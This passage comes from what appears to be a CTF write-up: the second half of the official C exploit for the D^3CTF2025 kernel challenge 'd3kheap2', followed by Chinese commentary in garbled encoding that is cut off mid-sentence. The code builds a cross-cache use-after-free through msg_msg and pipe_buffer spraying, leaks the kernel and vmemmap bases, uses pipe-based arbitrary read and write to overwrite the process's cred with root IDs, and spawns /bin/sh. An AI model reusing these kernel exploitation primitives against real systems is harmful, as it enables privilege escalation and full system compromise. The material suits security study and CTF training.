<span class="hljs-keyword">if</span> ((errno = d3kheap2_free(d3kheap2_fd, i)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;FAILED to free no.&quot;</span>)<span class="hljs-string">&quot;%d&quot;</span><br>                ERROR_MSG(<span class="hljs-string">&quot;d3kheap2 buffer! Retval: &quot;</span>)<span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                errno<br>            );<br>            err_exit(<span class="hljs-string">&quot;FAILED to free d3kheap2 buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Spraying msg_msg to reclaim...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (MSG_SPRAY_NR / <span class="hljs-number">2</span>); j++) &#123;<br>            <span class="hljs-keyword">if</span> (read_msg(reclaim_msgq[i],buf,<span class="hljs-number">0x1000</span><span class="hljs-number">-0x30</span>,MSG_TAG_BASE+j) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">snprintf</span>(<br>                    err_msg,<br>                    <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                    <span class="hljs-string">&quot;[x] Unable to reclaim %d-%d 4k msg_msg\n&quot;</span>,<br>                    i,<br>                    j<br>                );<br>                perror(err_msg);<br>                err_exit(<span class="hljs-string">&quot;FAILED to reclaim msg_msg!&quot;</span>);<br>            &#125;<br><br>            buf[<span class="hljs-number">520</span>] = i;<br>            buf[<span class="hljs-number">521</span>] = j;<br><br>            <span class="hljs-keyword">if</span> (write_msg(vuln_msgq[i],buf,MSG_SPRAY_SZ,MSG_TAG_BASE+j) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">snprintf</span>(<br>                    err_msg,<br>                    <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                    <span class="hljs-string">&quot;[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n&quot;</span>,<br>                    i,<br>                    j<br>                );<br>                perror(err_msg);<br>                err_exit(<span class="hljs-string">&quot;FAILED to spray msg_msg!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; D3KHEAP2_BUF_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((i / KMALLOC_2K_OBJ_PER_SLUB) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((errno = d3kheap2_free(d3kheap2_fd, i)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;FAILED to free no.&quot;</span>)<span class="hljs-string">&quot;%d&quot;</span><br>                ERROR_MSG(<span class="hljs-string">&quot;d3kheap2 buffer! Retval: &quot;</span>)<span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                errno<br>            );<br>            err_exit(<span class="hljs-string">&quot;FAILED to free d3kheap2 buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Spraying msg_msg to reclaim...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = MSG_SPRAY_NR / <span class="hljs-number">2</span>; j &lt; MSG_SPRAY_NR; j++) &#123;<br>            <span class="hljs-keyword">if</span> (read_msg(reclaim_msgq[i],buf,<span class="hljs-number">0x1000</span><span class="hljs-number">-0x30</span>,MSG_TAG_BASE+j) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">snprintf</span>(<br>                    err_msg,<br>                    <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                    <span class="hljs-string">&quot;[x] Unable to reclaim %d-%d 4k msg_msg\n&quot;</span>,<br>                    i,<br>                    j<br>                );<br>                perror(err_msg);<br>                err_exit(<span class="hljs-string">&quot;FAILED to reclaim msg_msg!&quot;</span>);<br>            &#125;<br><br>            buf[<span class="hljs-number">520</span>] = i;<br>            buf[<span class="hljs-number">521</span>] = j;<br><br>            <span class="hljs-keyword">if</span> (write_msg(vuln_msgq[i], buf, MSG_SPRAY_SZ, MSG_TAG_BASE+j) &lt; <span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-built_in">snprintf</span>(<br>                    err_msg,<br>                    <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                    <span class="hljs-string">&quot;[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n&quot;</span>,<br>                    i,<br>                    j<br>                );<br>                perror(err_msg);<br>                err_exit(<span class="hljs-string">&quot;FAILED to spray msg_msg!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* To be honest, we only need to free ONE obj here, just think :) */</span><br>    log_info(<span class="hljs-string">&quot;[*] Creating UAF on msg_msg...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; D3KHEAP2_BUF_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((errno = d3kheap2_free(d3kheap2_fd, i)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;FAILED to free no.&quot;</span>)<span class="hljs-string">&quot;%d&quot;</span><br>                ERROR_MSG(<span class="hljs-string">&quot;d3kheap2 buffer! Retval: &quot;</span>)<span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                errno<br>            );<br>            err_exit(<span class="hljs-string">&quot;FAILED to free d3kheap2 buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    found = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; MSG_SPRAY_NR; j++) &#123;<br>            buf[<span class="hljs-number">520</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>            buf[<span class="hljs-number">520</span>] += i;<br>            buf[<span class="hljs-number">521</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;D3CTFPWN&quot;</span>;<br>            buf[<span class="hljs-number">521</span>] += j;<br><br>            <span class="hljs-keyword">if</span> (write_msg(evil_msgq[i], buf, MSG_SPRAY_SZ, MSG_TAG_BASE + j)&lt;<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-built_in">snprintf</span>(<br>                    err_msg,<br>                    <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                    <span class="hljs-string">&quot;[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n&quot;</span>,<br>                    i,<br>                    j);<br>                perror(err_msg);<br>                err_exit(<span class="hljs-string">&quot;FAILED to spray msg_msg!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* make sure the UAF object is on CPU SLAB, so no more spray then */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; MSG_QUEUE_NR; k++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l = <span class="hljs-number">0</span>; l &lt; MSG_SPRAY_NR; l++) &#123;<br>            <span class="hljs-keyword">if</span> (peek_msg(vuln_msgq[k], buf, MSG_PEEK_SZ, l) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">snprintf</span>(<br>                    err_msg,<br>                    <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                    <span class="hljs-string">&quot;[x] Unable to peek %d-%d msg_msg\n&quot;</span>,<br>                    k,<br>                    l<br>                );<br>                perror(err_msg);<br>                err_exit(<span class="hljs-string">&quot;FAILED to peek msg_msg!&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">520</span>] == *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span><br>                || buf[<span class="hljs-number">521</span>] == *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;D3CTFPWN&quot;</span>) &#123;<br>                evilq_idx = buf[<span class="hljs-number">520</span>] - *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>                evilm_idx = buf[<span class="hljs-number">521</span>] - *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;D3CTFPWN&quot;</span>;<br>                vulq_idx = k;<br>                vulm_idx = l;<br>                <span class="hljs-built_in">printf</span>(<br>                    SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found victim on no.&quot;</span>)<span class="hljs-string">&quot;%d &quot;</span><br>                    SUCCESS_MSG(<span class="hljs-string">&quot;msg in no.&quot;</span>)<span class="hljs-string">&quot;%d&quot;</span>SUCCESS_MSG(<span class="hljs-string">&quot;vulqueue&quot;</span>)<br>                    SUCCESS_MSG(<span class="hljs-string">&quot;.Same msg is on no.&quot;</span>)<span class="hljs-string">&quot;%d &quot;</span><br>                    SUCCESS_MSG(<span class="hljs-string">&quot;msg in no.&quot;</span>)<span class="hljs-string">&quot;%d \n&quot;</span>,<br>                    vulm_idx,<br>                    vulq_idx,<br>                    evilm_idx,<br>                    evilq_idx<br>                );<br>                found = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">goto</span> out_uaf_msg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create cross-cache UAF by spraying msg_msg!&quot;</span>);<br>    &#125;<br><br>out_uaf_msg:<br>    log_info(<span class="hljs-string">&quot;[*] Shifting obj-overlapping from msg_msg to pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (read_msg(vuln_msgq[vulq_idx],buf,MSG_SPRAY_SZ,MSG_TAG_BASE+vulm_idx)&lt;<span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to free the victim msg_msg&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to free victim msg_msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (PIPE_SPRAY_NR / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">32</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">snprintf</span>(<br>                err_msg,<br>                <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&quot;[x] Unable to fcntl(F_SETPIPE_SZ) on no.%d pipe&quot;</span>,<br>                i<br>            );<br>            perror(err_msg);<br>            err_exit(<span class="hljs-string">&quot;FAILED to reclaim msg_msg with pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (read_msg(<br>        evil_msgq[evilq_idx],<br>        buf,<br>        MSG_SPRAY_SZ,<br>        MSG_TAG_BASE + evilm_idx<br>    ) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to free the victim msg_msg&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to free victim msg_msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* identification */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (PIPE_SPRAY_NR / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-comment">/* The greate j8 helps us a lot :) */</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++) &#123;<br>            write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(i));<br>        &#125;<br>    &#125;<br><br>    found = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (PIPE_SPRAY_NR / <span class="hljs-number">2</span>); i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">32</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">snprintf</span>(<br>                err_msg,<br>                <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&quot;[x] Unable to fcntl(F_SETPIPE_SZ) on no.%d pipe&quot;</span>,<br>                i<br>            );<br>            perror(err_msg);<br>            err_exit(<span class="hljs-string">&quot;FAILED to reclaim msg_msg with pipe_buffer!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">114</span>; j++) &#123;<br>            write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(i));<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * we keep checking to make sure that the object is allocated</span><br><span class="hljs-comment">         * from the first object of CPU SLUB, hence no spray later</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (PIPE_SPRAY_NR / <span class="hljs-number">2</span>); j++) &#123;<br>            <span class="hljs-type">int</span> ident;<br>            read(pipe_fd[j][<span class="hljs-number">0</span>], &amp;ident, <span class="hljs-keyword">sizeof</span>(ident));<br>            <span class="hljs-keyword">if</span> (ident != j) &#123;<br>                <span class="hljs-built_in">printf</span>(<br>                    SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found victim pipe: &quot;</span>)<span class="hljs-string">&quot;%d&quot;</span><br>                    SUCCESS_MSG(<span class="hljs-string">&quot; , overlapped with &quot;</span>)<span class="hljs-string">&quot;%d\n&quot;</span>,<br>                    j,<br>                    ident<br>                );<br>                victim_pipe = j;<br>                ovlp_pipe = ident;<br>                <span class="hljs-keyword">goto</span> out_overlap_pipe;<br>            &#125;<br>            write(pipe_fd[j][<span class="hljs-number">1</span>], &amp;ident, <span class="hljs-keyword">sizeof</span>(ident));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to shift OVERLAP from msg_msg to pipe_buffer!&quot;</span>);<br>    &#125;<br><br>out_overlap_pipe:<br>    close(pipe_fd[victim_pipe][<span class="hljs-number">1</span>]);<br>    close(pipe_fd[victim_pipe][<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">if</span> (pipe(atk_pipe) &lt; <span class="hljs-number">0</span> || fcntl(atk_pipe[<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span>*<span class="hljs-number">32</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate new pipe for attacking!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* move to pipe_buffer[1] */</span><br>    write(atk_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    read(atk_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">8</span>);<br>    write(atk_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    close(pipe_fd[ovlp_pipe][<span class="hljs-number">1</span>]);<br>    close(pipe_fd[ovlp_pipe][<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-keyword">if</span> (write_msg(atk_msgq, buf, MSG_SPRAY_SZ, MSG_TAG_BASE) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to allocate new msg_msg&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to reclaim the victim pipe_buffer as msg_msg!&quot;</span>);<br>    &#125;<br><br>    write(atk_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">if</span> (read_msg(atk_msgq, msg_buf, MSG_SPRAY_SZ, MSG_TAG_BASE) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to peek the victim object&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to peek the victim object!&quot;</span>);<br>    &#125;<br><br>    leak_pipe_buf = (<span class="hljs-type">void</span>*) &amp;msg_buf[<span class="hljs-number">516</span>];<br><br>    <span class="hljs-built_in">printf</span>(<br>        SUCCESS_MSG(<span class="hljs-string">&quot;[+] Leak pipe_buffer::page &quot;</span>) <span class="hljs-string">&quot;%p&quot;</span><br>        SUCCESS_MSG(<span class="hljs-string">&quot;, pipe_buffer::ops &quot;</span>) <span class="hljs-string">&quot;%p\n&quot;</span>,<br>        leak_pipe_buf-&gt;page,<br>        leak_pipe_buf-&gt;ops<br>    );<br><br>    pipe_flags = leak_pipe_buf-&gt;flags;<br>    pipe_ops = (<span class="hljs-type">void</span>*) leak_pipe_buf-&gt;ops;<br>    pipe_private = leak_pipe_buf-&gt;private;<br><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) leak_pipe_buf-&gt;page &amp; KASLR_MASK;<br>    log_info(<span class="hljs-string">&quot;[*] Try to guess vmemmap_base...&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Starts from %lx...\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-keyword">if</span> (write_msg(atk_msgq, msg_buf, MSG_SPRAY_SZ, MSG_TAG_BASE) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to allocate new msg_msg&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to reclaim the victim pipe_buffer as msg_msg!&quot;</span>);<br>    &#125;<br><br>    arbitrary_read_by_pipe(<br>        vmemmap_base + <span class="hljs-number">0x9d000</span> / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>,<br>        buf,<br>        <span class="hljs-number">0xff0</span>,<br>        atk_msgq,<br>        msg_buf,<br>        MSG_SPRAY_SZ,<br>        MSG_TAG_BASE<br>    );<br><br>    kernel_leak = buf[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> loop_nr = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; loop_nr++) &#123;<br>        <span class="hljs-keyword">if</span> (kernel_leak &gt; <span class="hljs-number">0xffffffff81000000</span><br>            &amp;&amp; (kernel_leak &amp; <span class="hljs-number">0xff</span>) &lt; <span class="hljs-number">0x100</span>) &#123;<br>            kernel_base = kernel_leak &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>            <span class="hljs-keyword">if</span> (loop_nr != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<br>                INFO_MSG(<span class="hljs-string">&quot;[*] Leak secondary_startup_64 : &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,kernel_leak<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got kernel base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, kernel_base);<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got vmemmap_base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, vmemmap_base);<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[?] Got leak: %lx\n&quot;</span>, kernel_leak);<br>            sleep(<span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">80</span>; i++) &#123;<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\b&#x27;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;[No.%d loop] Got unmatched data: %lx, keep looping...&quot;</span>,<br>            loop_nr,<br>            kernel_leak<br>        );<br><br>        vmemmap_base -= KASLR_GRANULARITY;<br>        arbitrary_read_by_pipe(<br>            vmemmap_base + <span class="hljs-number">0x9d000</span> / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>,<br>            buf,<br>            <span class="hljs-number">0xff0</span>,<br>            atk_msgq,<br>            msg_buf,<br>            MSG_SPRAY_SZ,<br>            MSG_TAG_BASE<br>        );<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Seeking task_struct in kernel space...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br>    uid = getuid();<br>    gid = getgid();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe(<br>            vmemmap_base + i * <span class="hljs-number">0x40</span>,<br>            buf,<br>            <span class="hljs-number">0xff0</span>,<br>            atk_msgq,<br>            msg_buf,<br>            MSG_SPRAY_SZ,<br>            MSG_TAG_BASE<br>        );<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0xff0</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] == comm_addr[<span class="hljs-number">-3</span>])) &#123;  <span class="hljs-comment">/* should be equal */</span><br><br>            <span class="hljs-built_in">printf</span>(<br>                SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found task_struct on page: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                (vmemmap_base + i * <span class="hljs-number">0x40</span>)<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got cred address: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,comm_addr[<span class="hljs-number">-2</span>]);<br><br>            cred_kaddr = comm_addr[<span class="hljs-number">-2</span>];<br>            cred_data = (<span class="hljs-type">void</span>*) (cred_data_buf + (cred_kaddr &amp; (<span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>)));<br>            page_offset_base = cred_kaddr &amp; KASLR_MASK;<br><br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>                cred_kpage_addr = vmemmap_base + \<br>                                (cred_kaddr - page_offset_base) / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>;<br>            <br>                arbitrary_read_by_pipe(<br>                    cred_kpage_addr,<br>                    cred_data_buf,<br>                    <span class="hljs-number">0xff0</span>,<br>                    atk_msgq,<br>                    msg_buf,<br>                    MSG_SPRAY_SZ,<br>                    MSG_TAG_BASE<br>                );<br>                <span class="hljs-keyword">if</span> (cred_data-&gt;uid == uid<br>                    &amp;&amp; cred_data-&gt;gid == gid) &#123;<br>                    <span class="hljs-built_in">printf</span>(<br>                        SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got page_offset_base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                        page_offset_base<br>                    );<br>                    <span class="hljs-built_in">printf</span>(<br>                        SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found cred on page: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                        cred_kpage_addr<br>                    );<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br><br>                page_offset_base -= KASLR_GRANULARITY;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[?] Looping!?&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting cred and granting root privilege...&quot;</span>);<br><br>    cred_data-&gt;uid = <span class="hljs-number">0</span>;<br>    cred_data-&gt;gid = <span class="hljs-number">0</span>;<br><br>    arbitrary_write_by_pipe(<br>        cred_kpage_addr,<br>        cred_data_buf,<br>        <span class="hljs-number">0xff0</span>,<br>        atk_msgq,<br>        msg_buf,<br>        MSG_SPRAY_SZ,<br>        MSG_TAG_BASE<br>    );<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    setresgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    get_root_shell();<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">banner</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;-------- D^3CTF2025::Pwn - d3kheap2 --------&quot;</span>) <span class="hljs-string">&quot;\n&quot;</span><br>    INFO_MSG(<span class="hljs-string">&quot;--------    Official Exploitation   --------\n&quot;</span>)<br>    INFO_MSG(<span class="hljs-string">&quot;--------      Author: &quot;</span>)<span class="hljs-string">&quot;arttnba3&quot;</span>INFO_MSG(<span class="hljs-string">&quot;      --------&quot;</span>) <span class="hljs-string">&quot;\n&quot;</span><br>    SUCCESS_MSG(<span class="hljs-string">&quot;-------- Local Privilege Escalation --------\n&quot;</span>));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    banner();<br>    exploit();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Whatâ€™s-moreâ€¦"><a href="#Whatâ€™s-moreâ€¦" class="headerlink" title="Whatâ€™s moreâ€¦"></a>Whatâ€™s moreâ€¦</h2><p>é¢˜ç›®çš„ä»‹ç»æ˜¯ç”±ç¬”è€…æ›¾ç»æœ€å–œæ¬¢çš„ä¸€é¦–åä¸º <a href="https://www.youtube.com/watch?v=LHCob76kigA">7years</a> çš„æ­Œçš„æ­Œè¯ä¿®æ”¹è€Œæ¥ï¼ˆè™½ç„¶å½“æ—¶ç¬”è€…æ˜¯ 15 years oldï¼‰ï¼Œå› ä¸ºè¿™å¸¸è®©æˆ‘å›å¿†èµ·æ›¾ç»çš„å°‘å¹´æ—¶æœŸï¼Œè€Œç¬”è€…å¸Œæœ›è¿™ä¹Ÿèƒ½è®©å¤§å®¶æƒ³èµ·è‡ªä» D^3CTF 2022 çš„ d3kheap ä»¥æ¥ Linux kernel exploitation çš„å‘å±•çš„æ­¥å­æ‰€è¿ˆä¹‹å¤§ï¼ˆ <del>è™½ç„¶è¿™ä¸¤ä»¶äº‹å¥½åƒæ²¡ä»€ä¹ˆå…³è”</del> ï¼‰ï¼Œæœ‰äº†æƒŠè‰³çš„ cross-cache attack æˆ‘ä»¬è¿‘ä¹èƒ½å¤Ÿé€šè¿‡å°† SLUB page ä»ä¸€ä¸ª <code>kmem_cache</code> è¿ç§»åˆ°å¦ä¸€ä¸ªçš„æ–¹å¼æ¥åˆ©ç”¨æ‰€æœ‰çš„ UAF ä¸ DF æ¼æ´ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘å°†è¿™é“é¢˜ç›®å‘½åä¸º <code>d3kheap2</code> çš„ç¼˜æ•…ï¼š <strong>Solution upgration from limited one for d3kheapâ€™s easy double free to general one for d3kheap2â€™s lunatic double free</strong></p><p>å°½ç®¡è¿™é“é¢˜ç›®çš„æ ¸å¿ƒæŠ€æœ¯åœ¨ 2025 